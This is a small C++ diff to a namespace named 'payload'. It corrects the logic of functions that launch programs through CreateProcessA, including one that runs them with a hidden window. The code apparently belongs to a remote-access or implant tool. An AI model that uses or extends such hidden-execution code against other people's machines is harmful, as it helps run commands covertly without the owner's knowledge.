@@ -11,6 +11,9 @@ namespace payload {
 		if (hide) {
 			info.wShowWindow = SW_HIDE;
 		}
+		else {
+			info.wShowWindow = SW_NORMAL;
+		}
 		if (!CreateProcessA(0, (LPSTR)program.c_str(), 0, 0, false, CREATE_NEW_CONSOLE, 0, 0, &info, &process_info))
 		{
 			return false;
@@ -23,9 +26,9 @@ namespace payload {
 	}
 
 	std::string process_execution_hidden(std::string program) {
-		if (process_execution(program, true))
+		if (!process_execution(program, true))
 		{
-			return "ERROR" + std::to_string(GetLastError());
+			return std::to_string(GetLastError());
 		}
 		else {
 			return "SUCCESS";
@@ -33,9 +36,9 @@ namespace payload {
 	}
 
 	std::string process_execution_show(std::string program) {
-		if (process_execution(program, false))
+		if (!process_execution(program, false))
 		{
-			return "ERROR" + std::to_string(GetLastError());
+			return std::to_string(GetLastError());
 		}
 		else {
 			return "SUCCESS";
